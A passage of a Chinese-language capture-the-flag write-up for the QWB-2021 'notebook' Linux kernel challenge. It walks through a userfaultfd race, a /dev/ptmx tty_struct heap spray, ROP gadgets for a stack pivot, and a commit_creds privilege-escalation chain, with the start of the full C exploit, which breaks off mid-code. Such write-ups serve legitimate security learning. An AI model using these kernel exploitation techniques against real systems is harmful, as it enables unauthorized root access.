class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg();</span><br><span class="line"></span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x2000</span>, mmap_space);        <span class="comment">// trigger page fault</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中最后一条语句就能够触发缺页异常。<br />
<img src="12.png" alt="" /><br />
可以看到确实成功了。</p>
<h1 id="step-13-exp编写另开线程进行恶意写入"><a class="markdownIt-Anchor" href="#step-13-exp编写另开线程进行恶意写入"></a> Step 13: exp编写——另开线程进行恶意写入</h1>
<p>需要注意的是，在read和write函数均有_check_object_size函数调用，用于检查内存块的大小。这里是为了检查note的真实大小是否等于size。为了绕过这个检查，我们除了需要使用noteedit函数外，还需要使用noteadd函数将size改小一些。</p>
<p>修改之前：<br />
<img src="13.png" alt="" /><br />
修改之后：<br />
<img src="14.png" alt="" /></p>
<h1 id="step-14-exp编写重复打开devptmx获取tty_struct地址"><a class="markdownIt-Anchor" href="#step-14-exp编写重复打开devptmx获取tty_struct地址"></a> Step 14: exp编写——重复打开/dev/ptmx，获取tty_struct地址</h1>
<p>在我们阻塞了一些线程之后，打开/dev/ptmx文件，tty_struct就有可能分配到note的地址中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里重复打开之后，遍历所有的note，检查其magic魔数以判断是否是tty_struct结构体。对于不是tty_struct结构体的note，我们选择两个出来作为假的tty_operations和假的栈空间，准备用于栈迁移。</p>
<h1 id="step-15-exp编写构造rop链"><a class="markdownIt-Anchor" href="#step-15-exp编写构造rop链"></a> Step 15: exp编写——构造ROP链</h1>
<p>在调用/dev/ptmx的write函数时，rdi指向tty_struct结构体本身，因此可以利用这种性质获取到tty_struct结构体的地址，并将rsp赋值为这个地址。我们需要找的是能够将rdi中的内容拷贝到rsp中的gadget。正好有这个gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/pwnfile/QWB/QWB-2021/notebook/附件# cat gadgets.txt | grep &#x27;push rdi ; pop rsp&#x27;</span><br><span class="line">0xffffffff812351be : push rdi ; pop rsp ; jmp 0xffffffff8123519f</span><br><span class="line">0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret</span><br><span class="line">0xffffffff8143f4e1 : push rdi ; pop rsp ; pop rbp ; or eax, edx ; ret</span><br></pre></td></tr></table></figure>
<p>这样我们就可以第一次栈迁移到tty_struct。</p>
<p>然后，我们在tty_struct中再构造一个简短的gadget。因为tty_struct对于/dev/ptmx文件操作至关重要，对于其中的字段我们能修改地越少越好。因此我们还需要第二次栈迁移。这第二次栈迁移我们选择迁移到假的tty_operations中，这个tty_operations也就是进行第一次栈迁移时使用的假的tty_operations，其中写有构造好的write函数，也就是用于第一次栈迁移到tty_struct的gadget。</p>
<p>这里我们使用下面的gadget来进行构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81002141 : pop rbx ; pop rbp ; ret</span><br><span class="line">0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
<p>我们在tty_struct[1]的位置写入第一个gadget，这样可以将假tty_operations（位于tty_struct[3]）地址拷贝到rbp中，然后在tty_struct[4]写入第二个gadget栈迁移到假tty_operations中。</p>
<p>由于tty_operations中需要有write函数指针指向第一次栈迁移gadget，为了避免覆盖，我们进行第三次栈迁移（或者使用诸如<code>add rsp, 0x10</code>这样的指令跳过）。</p>
<p>然后在第三次栈迁移后，我们终于可以相对自由地构造自己的rop链了。接下来就是常规的构造内核rop链过程：执行commit_creds(prepare_kernel_cred(NULL))、返回到用户态。注意这里含的<code>mov rdi, rax</code>的gadget不好找，在ROPgadget中没有这种gadget，但是通过objdump还是可以找到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ffffffff81045833:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">ffffffff81045836:	31 c0                	xor    %eax,%eax</span><br><span class="line">ffffffff81045838:	48 81 ff 00 00 00 09 	cmp    $0x9000000,%rdi</span><br><span class="line">ffffffff8104583f:	74 02                	je     ffffffff81045843 &lt;lmce_supported+0x33&gt;</span><br><span class="line">ffffffff81045841:	5d                   	pop    %rbp</span><br><span class="line">ffffffff81045842:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>另外在swapgs_restore_regs_and_return_to_usermode函数中，前面的一大堆pop我们不需要，因此可以直接跳过。</p>
<p><img src="15.png" alt="" /></p>
<p><img src="16.png" alt="" /></p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                                  <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">                  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                  <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                      <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">	<span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">	<span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptm_unix98_ops 0xFFFFFFFF81E8E440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pty_unix98_ops 0xFFFFFFFF81E8E320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_BASE 0xFFFFFFFF810A9B40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_BASE 0xFFFFFFFF810A9EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kernel_BASE 0xFFFFFFFF81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A00929</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> add_thread, edit_thread;</span><br><span class="line"><span class="type">char</span>* mmap_space;</span><br><span class="line"><span class="type">sem_t</span> add_sem, edit_sem;</span><br><span class="line"><span class="type">int</span> ptmx_fds[<span class="number">0x60</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* note;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;note;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span 